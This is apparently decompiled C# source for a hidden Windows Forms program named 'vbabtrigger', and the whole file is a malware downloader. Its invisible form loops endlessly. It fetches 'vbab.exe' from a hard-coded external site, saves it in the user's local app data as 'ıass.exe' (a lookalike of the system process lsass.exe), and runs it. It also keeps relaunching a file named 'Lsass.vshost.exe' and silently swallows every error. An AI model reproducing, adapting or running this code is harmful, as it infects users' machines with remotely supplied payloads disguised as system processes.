using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;

namespace vbabtrigger;

public class Form1 : Form
{
	public enum InternetConnectionState
	{
		INTERNET_CONNECTION_OFFLINE = 0x20,
		INTERNET_CONNECTION_CONFIGURED = 0x40
	}

	private IContainer components = null;

	private string appPath = Path.GetDirectoryName(Application.get_ExecutablePath()) + "\\";

	private string localapp = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);

	public string _url = "http://www.hemenileti.com/vbab/";

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		((Control)this).SuspendLayout();
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(720, 202));
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Control)this).set_Name("Form1");
		((Form)this).set_Opacity(0.0);
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_StartPosition((FormStartPosition)1);
		((Control)this).set_Text("Form1");
		((Form)this).add_Load((EventHandler)Form1_Load);
		((Control)this).ResumeLayout(false);
	}

	public Form1()
	{
		InitializeComponent();
	}

	[DllImport("wininet.dll")]
	public static extern bool InternetGetConnectedState(ref InternetConnectionState lpdwFlags, int dwReserved);

	private void Form1_Load(object sender, EventArgs e)
	{
		try
		{
			_function();
		}
		catch (Exception)
		{
		}
	}

	public void _function()
	{
		Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData);
		string fileName = Path.GetFileName(Application.get_ExecutablePath());
		_ = appPath + fileName;
		string text = "Lsass.vshost.exe";
		while (true)
		{
			InternetConnectionState lpdwFlags = (InternetConnectionState)0;
			if (!InternetGetConnectedState(ref lpdwFlags, 0))
			{
				Thread.Sleep(5000);
			}
			else if (!File.Exists(localapp + "\\" + text))
			{
				newfiledownload();
			}
			else
			{
				Process[] processesByName = Process.GetProcessesByName("Lsass.vshost");
				if (processesByName.Length <= 0)
				{
					Process.Start(localapp + "\\" + text);
				}
			}
			Application.DoEvents();
			Thread.Sleep(2500);
		}
	}

	public void newfiledownload()
	{
		string uriString = _url + "UpdateFile/vbab.exe";
		string text = "ıass.exe";
		WebClient webClient = new WebClient();
		webClient.DownloadFileCompleted += newfiledownloadcomplate;
		webClient.DownloadFileAsync(new Uri(uriString), localapp + "\\" + text);
	}

	private void newfiledownloadcomplate(object sender, AsyncCompletedEventArgs e)
	{
		string text = "ıass.exe";
		Thread.Sleep(2000);
		Process.Start(localapp + "\\" + text);
	}
}
